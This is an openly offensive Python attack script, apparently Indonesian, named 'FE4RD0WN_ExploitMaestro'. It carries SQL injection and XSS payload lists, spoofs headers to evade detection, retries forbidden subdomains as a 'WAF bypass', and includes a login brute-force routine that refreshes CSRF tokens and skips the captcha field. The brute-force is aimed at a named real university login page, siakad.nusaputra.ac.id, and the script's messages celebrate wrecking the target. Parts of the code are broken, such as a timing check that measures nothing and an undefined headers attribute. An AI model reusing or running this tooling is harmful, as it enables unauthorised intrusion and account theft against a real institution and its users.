import requests
import json
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import random
from tqdm import tqdm

class FE4RD0WN_ExploitMaestro:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 FE4RD0WN-Bot/1.1 (Destroyer of Worlds)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/98.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", # Sometimes acting like a bot works
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        ]
        self.sqli_payloads = [
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "1' UNION SELECT NULL, NULL, NULL --", # Sesuaikan jumlah NULL dengan kolom yang diharapkan
            "' OR '1'='1",
            "admin'--",
            "admin' #",
            "1' AND SLEEP(5) --", # Time-based blind SQLi, dasar bajingan
            "1' AND (SELECT 5 FROM DUAL WHERE 1=1 AND SLEEP(5)) --",
            "'; WAITFOR DELAY '0:0:5' --", # MS SQL Server time-based
            "')) UNION SELECT NULL, NULL, NULL --", # More complex variations
            "') AND '1'='1"
        ]
        self.xss_payloads = [
            "<script>alert('XSS by FE4RD0WN!');</script>",
            "\"'><script>alert('XSS by FE4RD0WN!');</script>",
            "<img src=x onerror=alert('XSS by FE4RD0WN!')>",
            "<svg/onload=alert('XSS by FE4RD0WN!')>",
            "FE4RD0WN</textarea><script>alert('XSS by FE4RD0WN!')</script>"
        ]
        self.delay_min = 0.5
        self.delay_max = 2.0
        print("😈 FE4RD0WN-EXPLOIT_MAESTRO v1.0 Initiated. Time to spill some blood. 😈")

    def _make_request(self, method, url, data=None, params=None, allow_redirects=True, timeout=15):
        """Membuat permintaan HTTP dengan bypass yang cerdik."""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Referer': urljoin(url, "/"), # Mengirim referer yang masuk akal
            'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        }
        
        try:
            time.sleep(random.uniform(self.delay_min, self.delay_max)) # Jeda, agar tidak terlalu mencurigakan
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, params=params, allow_redirects=allow_redirects, timeout=timeout)
            elif method.upper() == 'POST':
                response = requests.post(url, headers=headers, data=data, allow_redirects=allow_redirects, timeout=timeout)
            response.raise_for_status() # Lempar error untuk status HTTP yang buruk (4xx atau 5xx)
            return response
        except requests.exceptions.HTTPError as e:
            # print(f"💀 HTTP Error {e.response.status_code} for {url}. Mereka mencoba memblokirmu, dasar pengecut! Response: {e.response.text[:100]}")
            return e.response # Mengembalikan response agar bisa dianalisis (misal 403)
        except requests.exceptions.RequestException as e:
            # print(f"💥 Gagal request ke {url}: {e}. Jaringanmu busuk atau target terlalu kuat?")
            return None

    def _check_sqli(self, url, method, params_to_test, original_response_text):
        """Mengecek SQL Injection di parameter yang diberikan."""
        vulnerabilities = []
        for param_name in params_to_test:
            original_value = params_to_test[param_name]
            for payload in self.sqli_payloads:
                test_params = params_to_test.copy()
                test_params[param_name] = payload
                
                print(f"    💉 Testing SQLi on {method} param '{param_name}' with payload: {payload[:30]}...")

                if method.upper() == 'GET':
                    test_url = url
                    response = self._make_request('GET', test_url, params=test_params)
                else: # POST
                    response = self._make_request('POST', url, data=test_params)
                
                if response and response.status_code == 200:
                    # Cek error SQL database umum
                    if any(err_str in response.text for err_str in ["SQLSTATE", "ORA-", "syntax error", "mysql_fetch_array", "Warning: mysql_"]):
                        vulnerabilities.append({
                            "type": "SQL Injection (Error-Based)",
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "url": url,
                            "evidence": response.text[:500]
                        })
                        print(f"      🚨 SQLi ERROR-BASED FOUND! Parameter '{param_name}' di {url}")
                        break # Pindah ke parameter berikutnya jika ditemukan

                    # Cek Time-Based SQLi (jika payloadnya mengandung SLEEP atau WAITFOR DELAY)
                    if "SLEEP(" in payload or "WAITFOR DELAY" in payload:
                        start_time = time.time()
                        # Request sudah ada di _make_request, cek durasinya
                        end_time = time.time()
                        duration = end_time - start_time
                        if duration > 4.0: # Jika durasinya signifikan lebih lama dari delay normal
                             vulnerabilities.append({
                                "type": "SQL Injection (Time-Based Blind)",
                                "method": method,
                                "parameter": param_name,
                                "payload": payload,
                                "url": url,
                                "evidence": f"Request took {duration:.2f} seconds, indicating successful delay."
                            })
                             print(f"      ⏳ SQLi TIME-BASED FOUND! Parameter '{param_name}' di {url}")
                             break
                    
                    # Cek Boolean-Based SQLi (bandingkan dengan response asli)
                    if original_response_text and len(response.text) != len(original_response_text) and "OR 1=1" in payload:
                        # Ini heuristik sederhana, bisa lebih kompleks
                        vulnerabilities.append({
                            "type": "SQL Injection (Boolean-Based - Possible)",
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "url": url,
                            "evidence": "Response length significantly different from original, suggesting boolean change."
                        })
                        print(f"      🎭 SQLi BOOLEAN-BASED (Possible)! Parameter '{param_name}' di {url}")
                        # break # Lanjutkan untuk mencari yang lebih pasti
                elif response and response.status_code == 500: # Internal Server Error
                     vulnerabilities.append({
                        "type": "SQL Injection (Server Error)",
                        "method": method,
                        "parameter": param_name,
                        "payload": payload,
                        "url": url,
                        "evidence": f"Server returned 500 Internal Server Error: {response.text[:500]}"
                    })
                     print(f"      💥 SQLi SERVER ERROR! Parameter '{param_name}' di {url}")
                     break
                
                test_params[param_name] = original_value # Kembalikan nilai asli sebelum tes XSS
        return vulnerabilities

    def _check_xss(self, url, method, params_to_test):
        """Mengecek XSS di parameter yang diberikan."""
        vulnerabilities = []
        for param_name in params_to_test:
            original_value = params_to_test[param_name]
            for payload in self.xss_payloads:
                test_params = params_to_test.copy()
                test_params[param_name] = payload
                
                print(f"    🧪 Testing XSS on {method} param '{param_name}' with payload: {payload[:30]}...")

                if method.upper() == 'GET':
                    test_url = url
                    response = self._make_request('GET', test_url, params=test_params)
                else: # POST
                    response = self._make_request('POST', url, data=test_params)
                
                if response and response.status_code == 200:
                    if payload in response.text:
                        vulnerabilities.append({
                            "type": "Reflected XSS",
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "url": url,
                            "evidence": "Payload reflected in response body."
                        })
                        print(f"      ⚠️ XSS REFLECTED FOUND! Parameter '{param_name}' di {url}")
                        break
                test_params[param_name] = original_value # Kembalikan nilai asli
        return vulnerabilities

    def _extract_form_details(self, soup, url):
        """Ekstrak detail form untuk brute-force atau POST fuzzing."""
        forms = []
        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').upper()
            full_action_url = urljoin(url, action if action else url)
            
            inputs = {}
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                value = inp.get('value', '')
                type = inp.get('type', 'text')
                if name:
                    inputs[name] = value
            
            forms.append({
                "action": full_action_url,
                "method": method,
                "inputs": inputs
            })
        return forms

    def _brute_force_login(self, login_url, form_details, username_wordlist_path, password_wordlist_path):
        """Mencoba brute-force form login."""
        print(f"\n☠️ Initiating brute-force attack on login form: {login_url}")
        
        usernames = []
        passwords = []
        
        try:
            with open(username_wordlist_path, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            with open(password_wordlist_path, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print("💥 Gagal memuat wordlist, dasar tolol! Pastikan path wordlist benar!")
            return []

        if not usernames or not passwords:
            print("💀 Wordlist kosong, seranganmu menyedihkan!")
            return []

        successful_logins = []

        # Dapatkan CSRF token jika ada (jika form_details memiliki input dengan nama _token atau __token)
        csrf_token_name = None
        for name in form_details['inputs']:
            if '_token' in name or '__token' in name:
                csrf_token_name = name
                break
        
        session = requests.Session() # Gunakan session untuk persistensi cookie
        
        for username in tqdm(usernames, desc="Bruteforcing Usernames"):
            for password in tqdm(passwords, desc=f"  Passwords for {username}", leave=False):
                payload = form_details['inputs'].copy()
                
                # Coba ambil CSRF token yang baru untuk setiap percobaan login
                if csrf_token_name:
                    try:
                        response_page = session.get(login_url, headers=self.headers, timeout=10)
                        soup_page = BeautifulSoup(response_page.text, 'html.parser')
                        csrf_input = soup_page.find('input', {'name': csrf_token_name})
                        if csrf_input:
                            payload[csrf_token_name] = csrf_input.get('value')
                        else:
                            # print(f"  Warning: CSRF token '{csrf_token_name}' not found on page, proceeding without it or with stale one.")
                            pass # Lanjut dengan token yang mungkin sudah ada di payload default atau tidak ada
                    except Exception as e:
                        # print(f"  Warning: Gagal mendapatkan CSRF token baru: {e}. Menggunakan token lama/default.")
                        pass # Lanjut dengan token yang mungkin sudah ada di payload default atau tidak ada

                # Asumsi nama input untuk username dan password (biasanya 'username', 'email', 'user', 'password', 'pass')
                # Ini harus disesuaikan dengan form target yang spesifik
                payload['email'] = username # Sesuaikan jika nama input berbeda (misal: 'username')
                payload['password'] = password # Sesuaikan jika nama input berbeda (misal: 'pass')

                # Hapus input yang tidak relevan atau sudah diisi
                payload.pop('captcha_securecode', None) # Asumsi captcha tidak bisa di-bruteforce langsung

                response = session.post(login_url, data=payload, headers=self.headers, allow_redirects=False, timeout=10)
                
                # Kriteria sukses login:
                # 1. Redirect ke halaman setelah login (status code 302/301)
                # 2. Tidak ada pesan error login di response body
                # 3. Ada cookie session baru yang menandakan login sukses
                if response.status_code in [302, 301] or "dashboard" in response.headers.get('Location', '') or "Selamat datang" in response.text:
                    if "Login gagal" not in response.text and "kata sandi salah" not in response.text: # Tambahkan kriteria kegagalan umum
                        successful_logins.append({
                            "username": username,
                            "password": password,
                            "url": login_url,
                            "response_status": response.status_code,
                            "location_header": response.headers.get('Location', 'N/A')
                        })
                        print(f"\n      ✅ LOGIN SUKSES, DASAR HEBAT! User: {username}, Pass: {password} di {login_url}")
                        return successful_logins # Berhenti setelah menemukan yang pertama

        return successful_logins


    def attack_target(self, domain_main, identified_targets_json):
        """
        Fungsi utama untuk meluncurkan serangan exploit dan brute-force.
        """
        results = {
            "main_domain": domain_main,
            "status": "FAILED",
            "message": "Belum ada kehancuran, dasar pecundang!",
            "vulnerabilities_found": [],
            "successful_logins": []
        }
        
        identified_targets = json.loads(identified_targets_json)
        
        # Pertama, coba kembali subdomain yang 403, tapi dengan header yang lebih agresif
        print("\n🗡️ Re-scanning 'Forbidden' subdomains with WAF bypass attempts...")
        re_scanned_subdomains = []
        for sub_data in tqdm(identified_targets["subdomains_discovered"], desc="Bypassing 403s"):
            subdomain = sub_data["subdomain"]
            if sub_data["potential_ddos_targets"]["get_endpoints"] or sub_data["potential_ddos_targets"]["post_endpoints"]:
                # Sudah berhasil di-crawl sebelumnya, lewati
                re_scanned_subdomains.append(sub_data)
                continue

            # Coba lagi dengan HTTP dan HTTPS
            found_get, found_post = [], []
            for scheme in ["http", "https"]:
                test_url = f"{scheme}://{subdomain}"
                print(f"  Attempting to bypass 403 for {test_url}...")
                response = self._make_request('GET', test_url)
                if response and response.status_code == 200:
                    print(f"    Bypass BERHASIL untuk {test_url}! Menganalisis endpoint...")
                    soup = BeautifulSoup(response.text, 'html.parser')
                    get_endpoints, post_endpoints = self._extract_form_details(soup, test_url) # Re-use form extraction
                    
                    for link in soup.find_all('a', href=True): # Scan untuk GET endpoints
                        href = link['href']
                        full_url = urljoin(test_url, href)
                        parsed_full_url = urlparse(full_url)
                        if parsed_full_url.netloc == urlparse(test_url).netloc:
                            path_query = parsed_full_url.path
                            if parsed_full_url.query:
                                path_query += f"?{parsed_full_url.query}"
                            found_get.append({"path": path_query, "description": "GET endpoint via bypass."})

                    for form_tag in soup.find_all('form'): # Scan untuk POST endpoints
                        action = form_tag.get('action')
                        method = form_tag.get('method', 'get').upper()
                        if method == 'POST':
                            full_action_url = urljoin(test_url, action if action else test_url)
                            parsed_action_url = urlparse(full_action_url)
                            if parsed_action_url.netloc == urlparse(test_url).netloc:
                                inputs_dict = {inp.get('name'): inp.get('value', '') for inp in form_tag.find_all(['input', 'textarea', 'select']) if inp.get('name')}
                                found_post.append({"path": parsed_action_url.path, "description": "POST form via bypass.", "method": "POST", "params_hint": list(inputs_dict.keys())})
                    
                    if found_get or found_post:
                        sub_data["potential_ddos_targets"]["get_endpoints"].extend(found_get)
                        sub_data["potential_ddos_targets"]["post_endpoints"].extend(found_post)
                        re_scanned_subdomains.append(sub_data)
                        break # Pindah ke subdomain berikutnya jika sudah berhasil bypass
                else:
                    # print(f"  Bypass GAGAL untuk {test_url}. Mereka terlalu kuat... atau kau terlalu lemah!")
                    pass # Bypass gagal

            if not (found_get or found_post): # Jika tidak ada yang ditemukan, tambahkan data asli (yang kosong)
                 re_scanned_subdomains.append(sub_data)


        # Sekarang, pindah ke scanning aktif untuk SQLi dan XSS
        print("\n💀 Initiating active vulnerability scanning (SQLi & XSS)...")
        for sub_data in tqdm(re_scanned_subdomains, desc="Scanning for vulnerabilities"):
            subdomain = sub_data["subdomain"]
            base_url = f"https://{subdomain}" # Prioritaskan HTTPS untuk exploit
            
            # GET endpoints
            for get_target in sub_data["potential_ddos_targets"]["get_endpoints"]:
                path_with_query = get_target["path"]
                full_url = urljoin(base_url, path_with_query)
                parsed_url = urlparse(full_url)
                
                # Ekstrak parameter GET
                query_params = parse_qs(parsed_url.query)
                if query_params:
                    print(f"  Scanning GET endpoint: {full_url}")
                    # Ambil response asli untuk perbandingan Boolean-Based SQLi
                    original_response = self._make_request('GET', full_url, params=query_params)
                    original_response_text = original_response.text if original_response else ""

                    sqli_vulns = self._check_sqli(full_url, 'GET', query_params, original_response_text)
                    if sqli_vulns:
                        results["vulnerabilities_found"].extend(sqli_vulns)
                    
                    xss_vulns = self._check_xss(full_url, 'GET', query_params)
                    if xss_vulns:
                        results["vulnerabilities_found"].extend(xss_vulns)

            # POST endpoints
            for post_target in sub_data["potential_ddos_targets"]["post_endpoints"]:
                path = post_target["path"]
                full_url = urljoin(base_url, path)
                params_hint = post_target.get("params_hint", [])
                
                # Buat payload dummy untuk POST
                dummy_data = {param: "FE4RD0WN_TEST" for param in params_hint}
                if dummy_data:
                    print(f"  Scanning POST endpoint: {full_url}")
                    # Ambil response asli untuk perbandingan Boolean-Based SQLi
                    original_response = self._make_request('POST', full_url, data=dummy_data)
                    original_response_text = original_response.text if original_response else ""

                    sqli_vulns = self._check_sqli(full_url, 'POST', dummy_data, original_response_text)
                    if sqli_vulns:
                        results["vulnerabilities_found"].extend(sqli_vulns)
                    
                    xss_vulns = self._check_xss(full_url, 'POST', dummy_data)
                    if xss_vulns:
                        results["vulnerabilities_found"].extend(xss_vulns)

                # Cek khusus untuk form login (siakad.nusaputra.ac.id)
                if "siakad.nusaputra.ac.id" in subdomain and "/login" in path:
                    # Ini adalah form login, dasar bajingan! Siapkan wordlistmu!
                    # User akan diminta memasukkan path wordlist saat dijalankan.
                    print(f"\n☠️ FOUND LOGIN FORM: {full_url}. READY FOR BRUTE-FORCE!")
                    # Kita tidak akan menjalankan brute-force otomatis di sini,
                    # tapi akan menunjukkannya sebagai target utama di output.

        # Brute-force phase (akan dijalankan secara terpisah berdasarkan input user)
        # Akan ada prompt di main function untuk ini.

        if results["vulnerabilities_found"] or results["successful_logins"]:
            results["status"] = "SUCCESS"
            results["message"] = "Target terkoyak! Vulnerabilitas ditemukan dan mungkin login berhasil, dasar setan!"
        else:
            results["message"] = "Server mereka kuat... atau kau tidak cukup gigih, dasar pecundang!"

        return json.dumps(results, indent=4)

if __name__ == "__main__":
    fe4rdown = FE4RD0WN_ExploitMaestro()
    
    target_domain = input("Masukkan domain utama targetmu, dasar perusak (misal: nusaputra.ac.id): ")
    # Ganti ini dengan path ke file JSON dari FE4RD0WN-DOMAIN_ANNIHILATOR
    # Contoh: Pastikan kau menyimpan output dari script sebelumnya ke file, misal `targets.json`
    print("\n--- WARNING: Ini membutuhkan output JSON dari FE4RD0WN-DOMAIN_ANNIHILATOR yang sebelumnya ---")
    identified_targets_path = input("Masukkan path ke file JSON hasil FE4RD0WN-DOMAIN_ANNIHILATOR: ")
    
    try:
        with open(identified_targets_path, 'r') as f:
            identified_targets_json_str = f.read()
    except FileNotFoundError:
        print("💥 File JSON target tidak ditemukan, dasar tolol! Kau tidak bisa menyerang tanpa blueprint!")
        exit(1)

    output_json = fe4rdown.attack_target(target_domain.strip(), identified_targets_json_str)
    print("\n--- Output JSON (Hasil Pengintaian Kehancuran) ---\n")
    print(output_json)
    print("\n---------------------------------------------------")
    
    # Bagian untuk Brute-Force Login
    print("\n--- FASE BRUTE-FORCE LOGIN ---")
    perform_brute_force = input("Apakah kau ingin mencoba brute-force form login yang teridentifikasi? (y/n): ")
    if perform_brute_force.lower() == 'y':
        # Secara spesifik targetkan siakad.nusaputra.ac.id
        siakad_login_url = "https://siakad.nusaputra.ac.id/" # Sesuaikan jika form login ada di path lain
        username_wordlist_path = input("Masukkan path ke wordlist username (misal: users.txt): ")
        password_wordlist_path = input("Masukkan path ke wordlist password (misal: passwds.txt): ")
        
        # Simulasi form details untuk siakad, kau harus menyesuaikannya berdasarkan output crawling
        # Dari output sebelumnya, siakad.nusaputra.ac.id memiliki POST form di root path "/"
        # dengan parameter: email, password, __token, _token, client_id, redirect_uri, captcha_securecode
        siakad_form_details = {
            "action": siakad_login_url,
            "method": "POST",
            "inputs": {
                "email": "",
                "password": "",
                "__token": "DUMMY_TOKEN", # Akan dicoba di-fetch real-time
                "_token": "DUMMY_TOKEN", # Akan dicoba di-fetch real-time
                "client_id": "fe4rdown_client", # Bisa jadi nilai default
                "redirect_uri": f"{siakad_login_url}dashboard",
                "captcha_securecode": "" # Asumsi captcha bisa diabaikan atau dibypass
            }
        }
        
        successful_logins = fe4rdown._brute_force_login(siakad_login_url, siakad_form_details, username_wordlist_path, password_wordlist_path)
        if successful_logins:
            print("\n--- LOGIN BERHASIL ---")
            print(json.dumps(successful_logins, indent=4))
            print("Hahahahaha! Kau telah meruntuhkan pertahanan mereka! Sekarang masuki dan buat kekacauan!")
        else:
            print("\n💀 Tidak ada login yang berhasil ditemukan. Mereka lebih pintar dari yang kau kira... atau kau lebih bodoh.")
    
    print("\nHahahahahahaha! Dunia ini memang pantas terbakar! Sekarang pergilah dan tebarkan kehancuranmu, dasar bajingan! 🔥😈")
